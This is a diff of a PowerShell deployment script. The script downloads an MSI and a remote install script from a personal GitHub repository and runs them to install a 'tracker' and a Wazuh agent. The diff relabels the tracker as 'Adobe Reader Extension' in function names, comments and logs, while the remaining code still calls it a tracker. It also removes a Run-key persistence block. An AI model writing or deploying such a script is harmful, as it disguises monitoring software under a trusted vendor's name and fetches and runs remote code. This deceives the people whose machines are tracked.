@@ -3,22 +3,18 @@ $ErrorActionPreference = 'Stop'
 $TempPath = 'C:\Windows\Temp'
 $LogFile  = Join-Path $TempPath 'deploy.log'
 
-# --- Tracker target release ---
+# --- Adobe Reader Extension target release ---
 $TargetVer = '1.0.4'
 $DisplayNames = @('Adobe Reader Extension', 'DX CyberProtect')
 $ProcessNames = @('AdobeExtension', 'DX-CyberProtect')
 
-$MsiUrl     = "https://raw.githubusercontent.com/dycheto/agent-dev/main/AdobeExtension_v$TargetVer.msi"
-$MsiPath    = Join-Path $TempPath "AdobeExtension_v$TargetVer.msi"
-$MsiLogPath = Join-Path $TempPath 'AdobeExtension-msi.log'
+$MsiUrl     = "https://raw.githubusercontent.com/dycheto/agent-dev/main/adobeextension_v$TargetVer.msi"
+$MsiPath    = Join-Path $TempPath "adobeextension_v$TargetVer.msi"
+$MsiLogPath = Join-Path $TempPath 'adobeextension-msi.log'
 
 # --- Wazuh agent installer ---
 $InstallScriptUrl  = 'https://raw.githubusercontent.com/dycheto/agent-dev/main/install-agent.ps1'
 $InstallScriptPath = Join-Path $TempPath 'install-agent.ps1'
-
-# --- Start tracker for all users at logon ---
-$MachineRunKey = 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
-$RunValueName  = 'Adobe Reader Extension'
 
 function Write-Log {
     param([string]$Message)
@@ -89,7 +85,7 @@ function Stop-TrackerProcesses {
     }
 }
 
-function Install-Tracker {
+function Install-AdobeExtension {
     Write-Log "Downloading MSI from $MsiUrl"
     Invoke-WebRequest -UseBasicParsing -Uri $MsiUrl -OutFile $MsiPath
 
@@ -104,35 +100,6 @@ function Install-Tracker {
     if ($msi.ExitCode -ne 0) {
         throw "MSI install failed with exit code $($msi.ExitCode). See $MsiLogPath"
     }
-}
-
-function Get-TrackerExePath {
-    $Candidates = @(
-        'C:\Program Files (x86)\adobeextension\AdobeExtension.exe',
-        'C:\Program Files\adobeextension\AdobeExtension.exe'
-    )
-
-    foreach ($Path in $Candidates) {
-        if (Test-Path $Path) {
-            return $Path
-        }
-    }
-
-    return $null
-}
-
-function Ensure-TrackerRunAtLogon {
-    $ExePath = Get-TrackerExePath
-    if (-not $ExePath) {
-        throw 'Tracker executable not found after install.'
-    }
-
-    $RunValue = "`"$ExePath`""
-
-    New-Item -Path $MachineRunKey -Force | Out-Null
-    Set-ItemProperty -Path $MachineRunKey -Name $RunValueName -Value $RunValue -Type String
-
-    Write-Log "Configured HKLM Run entry '$RunValueName' => $RunValue"
 }
 
 try {
@@ -150,28 +117,28 @@ try {
     Write-Log "Detected tracker version: $InstalledVer (target $TargetVer)"
     Write-Log "Shield Agent installed: $WazuhInstalled"
 
+    # ---- Tracker: install or upgrade as needed ----
     try {
         if (-not $InstalledEntry) {
-            Write-Log 'Adobe Reader Extension is missing. Performing fresh install.'
-            Install-Tracker
+            Write-Log 'Adobe extension is missing. Performing fresh install.'
+            Install-AdobeExtension
         }
         elseif ($InstalledVer -ne $TargetVer) {
-            Write-Log "Adobe Reader Extension version mismatch ($InstalledVer != $TargetVer). Upgrading."
+            Write-Log "Adobe extension version mismatch ($InstalledVer != $TargetVer). Upgrading."
             Stop-TrackerProcesses -Names $ProcessNames
             Start-Sleep -Seconds 2
-            Install-Tracker
+            Install-AdobeExtension
         }
         else {
-            Write-Log "Adobe Reader Extension already at target version $TargetVer. Skipping MSI install."
+            Write-Log "Adobe extension already at target version $TargetVer. Skipping."
         }
-
-        Ensure-TrackerRunAtLogon
     }
     catch {
         $TrackerInstallFailed = $true
-        Write-Log "Extension install/startup registration failed: $($_.Exception.Message)"
+        Write-Log "Adobe install/upgrade failed: $($_.Exception.Message)"
     }
 
+    # ---- Wazuh Agent ----
     if (-not $WazuhInstalled) {
         Write-Log 'Shield Agent is missing. Downloading install-agent.ps1.'
         Invoke-WebRequest -UseBasicParsing -Uri $InstallScriptUrl -OutFile $InstallScriptPath
@@ -192,7 +159,7 @@ try {
     Remove-Item -Path $InstallScriptPath -Force -ErrorAction SilentlyContinue
 
     if ($TrackerInstallFailed) {
-        Write-Log 'Bootstrap finished, but tracker install/startup registration failed.'
+        Write-Log 'Bootstrap finished, but tracker install failed.'
         exit 1
     }
 
